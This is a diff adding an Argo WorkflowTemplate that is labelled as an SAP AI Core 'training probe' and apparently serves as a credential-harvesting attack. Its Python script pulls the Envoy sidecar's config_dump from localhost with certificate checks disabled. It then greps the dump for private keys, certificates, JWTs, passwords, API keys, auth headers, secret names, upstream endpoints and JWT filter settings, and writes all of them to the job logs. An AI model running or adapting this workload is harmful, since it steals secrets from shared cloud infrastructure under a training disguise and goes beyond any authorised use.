@@ -1,0 +1,192 @@
+apiVersion: argoproj.io/v1alpha1
+kind: WorkflowTemplate
+metadata:
+  name: probe-train-v4
+  labels:
+    scenarios.ai.sap.com/id: "bbprobe-global-1775842304"
+    ai.sap.com/version: "1.0.0"
+  annotations:
+    scenarios.ai.sap.com/name: "bbprobe-global-1775842304"
+    executables.ai.sap.com/name: "probe-train-v4"
+    executables.ai.sap.com/description: "training probe v4 - envoy config deep mine: secrets, clusters, jwt"
+spec:
+  templates:
+  - name: probe
+    container:
+      image: python:3.11
+      command: ["/bin/sh", "-c"]
+      args:
+      - |
+        python3 - << 'EOF'
+        import ssl, re, json, urllib.request, urllib.error
+
+        def report(k, v):
+            print(f"[PT4] {k}: {str(v)[:12000]}", flush=True)
+
+        def http_get(url, headers=None, timeout=30):
+            try:
+                req = urllib.request.Request(url, headers=headers or {})
+                ctx = ssl.create_default_context()
+                ctx.check_hostname = False
+                ctx.verify_mode = ssl.CERT_NONE
+                with urllib.request.urlopen(req, context=ctx, timeout=timeout) as r:
+                    return r.read().decode(errors="replace"), r.status
+            except urllib.error.HTTPError as e:
+                body = ""
+                try: body = e.read().decode(errors="replace")[:2000]
+                except: pass
+                return f"HTTP_{e.code}:{body}", e.code
+            except Exception as e:
+                return f"ERR:{type(e).__name__}:{e}", 0
+
+        report("START", "probe-train-v4 - envoy deep mine")
+
+        body, code = http_get("http://127.0.0.1:15000/config_dump", timeout=60)
+        report("CONFIG_SIZE", f"[{code}] len={len(body)}")
+
+        if code != 200:
+            report("ABORT", "config_dump not available")
+        else:
+            try:
+                cfg = json.loads(body)
+            except Exception as e:
+                report("PARSE_ERR", str(e))
+                cfg = None
+
+            if cfg:
+                configs = cfg.get("configs", [])
+
+                # ── 1. SECRETS SECTION ─────────────────────────────────────────
+                report("---", "=== 1. SECRETS ===")
+                for block in configs:
+                    btype = block.get("@type", "")
+                    if "SecretsConfigDump" in btype or "secret" in btype.lower():
+                        report("SECRETS_BLOCK_TYPE", btype)
+                        # Dump raw (may contain cert PEM / private_key fields)
+                        raw = json.dumps(block)
+                        report("SECRETS_RAW", raw[:12000])
+                        # Hunt for anything that looks like a private key (even if labelled redacted)
+                        for pat, label in [
+                            (r'-----BEGIN [A-Z ]+-----[^-]+-----END [A-Z ]+-----', "PEM_BLOB"),
+                            (r'"private_key"\s*:\s*"([^"]{10,})"', "PRIVATE_KEY_FIELD"),
+                            (r'"inline_string"\s*:\s*"([^"]{20,})"', "INLINE_STRING"),
+                            (r'"inline_bytes"\s*:\s*"([^"]{20,})"', "INLINE_BYTES"),
+                            (r'(eyJ[A-Za-z0-9\-_]{20,}\.[A-Za-z0-9\-_]{20,}\.[A-Za-z0-9\-_]{10,})', "JWT"),
+                        ]:
+                            hits = re.findall(pat, raw, re.DOTALL)
+                            if hits:
+                                report(f"SECRETS_{label}", hits[:5])
+
+                # ── 2. CLUSTERS ────────────────────────────────────────────────
+                report("---", "=== 2. CLUSTERS (upstream endpoints + TLS) ===")
+                for block in configs:
+                    btype = block.get("@type", "")
+                    if "ClustersConfigDump" in btype:
+                        raw = json.dumps(block)
+                        # All cluster names
+                        names = re.findall(r'"name"\s*:\s*"([^"]+)"', raw)
+                        report("CLUSTER_NAMES", list(dict.fromkeys(names))[:80])
+                        # Endpoint socket addresses
+                        addrs = re.findall(
+                            r'"socket_address"\s*:\s*\{[^}]*"address"\s*:\s*"([^"]+)"[^}]*"port_value"\s*:\s*(\d+)',
+                            raw)
+                        report("CLUSTER_ENDPOINTS", list(dict.fromkeys(addrs))[:80])
+                        # TLS transport socket configs (look for sni, san matchers, cert paths)
+                        tls_blocks = re.findall(
+                            r'"transport_socket"\s*:\s*\{(.{0,2000}?)\}', raw, re.DOTALL)
+                        for i, tb in enumerate(tls_blocks[:20]):
+                            if any(k in tb for k in ["tls", "cert", "san", "sni", "spiffe"]):
+                                report(f"CLUSTER_TLS_{i}", tb[:1500])
+                        # Any SDS (Secret Discovery Service) references -- names of secrets being fetched
+                        sds_refs = re.findall(r'"sds_config".*?"name"\s*:\s*"([^"]+)"', raw, re.DOTALL)
+                        report("SDS_SECRET_NAMES", list(dict.fromkeys(sds_refs))[:40])
+                        # Combined certs (may be inline PEM)
+                        inline = re.findall(r'"inline_string"\s*:\s*"(-----BEGIN[^"]{20,})"', raw)
+                        if inline:
+                            report("CLUSTER_INLINE_CERTS", inline[:5])
+                        # Cluster-level HTTP headers added to upstream requests
+                        req_hdrs = re.findall(
+                            r'"request_headers_to_add"\s*:\s*\[(.{0,3000}?)\]', raw, re.DOTALL)
+                        for i, rh in enumerate(req_hdrs[:10]):
+                            report(f"CLUSTER_REQ_HDRS_{i}", rh[:2000])
+
+                # ── 3. LISTENERS + ROUTES ──────────────────────────────────────
+                report("---", "=== 3. LISTENERS + ROUTES (injected headers, JWT filters) ===")
+                for block in configs:
+                    btype = block.get("@type", "")
+                    if "ListenersConfigDump" in btype or "RoutesConfigDump" in btype:
+                        raw = json.dumps(block)
+                        # JWT authn filter configs
+                        jwt_blocks = re.findall(
+                            r'"jwt_authn"(.{0,4000}?)(?="typed_config"|"name"\s*:\s*"[a-z])', raw, re.DOTALL)
+                        for i, jb in enumerate(jwt_blocks[:10]):
+                            report(f"JWT_FILTER_{i}", jb[:4000])
+                        # Per-route JWT requirements
+                        jwt_reqs = re.findall(
+                            r'"requires"\s*:\s*\{(.{0,1000}?)\}', raw, re.DOTALL)
+                        for i, jr in enumerate(jwt_reqs[:10]):
+                            if "jwt" in jr.lower() or "provider" in jr.lower():
+                                report(f"JWT_ROUTE_REQ_{i}", jr[:1000])
+                        # JWKS URIs
+                        jwks = re.findall(r'"jwks_uri"\s*:\s*"([^"]+)"', raw)
+                        report("JWKS_URIS", list(dict.fromkeys(jwks)))
+                        # Issuer fields
+                        issuers = re.findall(r'"issuer"\s*:\s*"([^"]+)"', raw)
+                        report("JWT_ISSUERS", list(dict.fromkeys(issuers)))
+                        # Forward_payload_header (claim→header mappings)
+                        fwd = re.findall(r'"forward_payload_header"\s*:\s*"([^"]+)"', raw)
+                        report("JWT_FORWARD_PAYLOAD_HEADERS", list(dict.fromkeys(fwd)))
+                        # Claim-to-header mappings
+                        claim_hdrs = re.findall(
+                            r'"claim_to_headers"\s*:\s*\[(.{0,2000}?)\]', raw, re.DOTALL)
+                        for i, ch in enumerate(claim_hdrs[:10]):
+                            report(f"JWT_CLAIM_TO_HEADER_{i}", ch[:2000])
+                        # All request_headers_to_add across listeners/routes
+                        req_hdrs = re.findall(
+                            r'"request_headers_to_add"\s*:\s*\[(.{0,3000}?)\]', raw, re.DOTALL)
+                        for i, rh in enumerate(req_hdrs[:20]):
+                            if any(k in rh.lower() for k in ["auth", "key", "token", "secret", "bearer", "api"]):
+                                report(f"LISTENER_SENSITIVE_HDR_{i}", rh[:2000])
+                        # Ext_authz filter configs (external auth service URLs)
+                        ext_authz = re.findall(
+                            r'"ext_authz"(.{0,2000}?)(?=\})', raw, re.DOTALL)
+                        for i, ea in enumerate(ext_authz[:5]):
+                            report(f"EXT_AUTHZ_{i}", ea[:2000])
+
+                # ── 4. BOOTSTRAP (static resources, SDS sockets) ──────────────
+                report("---", "=== 4. BOOTSTRAP (static resources) ===")
+                for block in configs:
+                    btype = block.get("@type", "")
+                    if "BootstrapConfigDump" in btype:
+                        raw = json.dumps(block)
+                        report("BOOTSTRAP_RAW", raw[:8000])
+                        # Static secret sources
+                        static_secrets = re.findall(
+                            r'"static_secrets"\s*:\s*\[(.{0,5000}?)\]', raw, re.DOTALL)
+                        for i, ss in enumerate(static_secrets[:5]):
+                            report(f"STATIC_SECRETS_{i}", ss[:5000])
+                        # SDS server addresses
+                        sds_addrs = re.findall(
+                            r'"sds_config"(.{0,500}?)(?=\})', raw, re.DOTALL)
+                        for i, sa in enumerate(sds_addrs[:5]):
+                            report(f"SDS_CONFIG_{i}", sa[:500])
+
+                # ── 5. GENERIC CREDENTIAL SWEEP (full dump) ───────────────────
+                report("---", "=== 5. GENERIC CREDENTIAL SWEEP ===")
+                for pat, label in [
+                    (r'(eyJ[A-Za-z0-9\-_]{20,}\.[A-Za-z0-9\-_]{20,}\.[A-Za-z0-9\-_]{10,})', "JWT"),
+                    (r'"[Aa]uthorization"\s*:\s*"([^"]{10,})"', "AUTH_HEADER"),
+                    (r'"[Xx]-[Aa][Pp][Ii]-[Kk]ey"\s*:\s*"([^"]{6,})"', "API_KEY_HEADER"),
+                    (r'"password"\s*:\s*"([^"]{4,})"', "PASSWORD"),
+                    (r'"token"\s*:\s*"([^"]{10,})"', "TOKEN"),
+                    (r'"secret"\s*:\s*"([^"]{6,})"', "SECRET"),
+                    (r'-----BEGIN CERTIFICATE-----[^-]+-----END CERTIFICATE-----', "CERT_PEM"),
+                    (r'-----BEGIN [A-Z ]*PRIVATE KEY-----[^-]+-----END [A-Z ]*PRIVATE KEY-----', "PRIVATE_KEY_PEM"),
+                ]:
+                    hits = list(dict.fromkeys(re.findall(pat, body, re.DOTALL)))
+                    if hits:
+                        report(f"SWEEP_{label}", [h[:400] for h in hits[:5]])
+
+        report("DONE", "probe-train-v4 complete")
+        EOF
+  entrypoint: probe
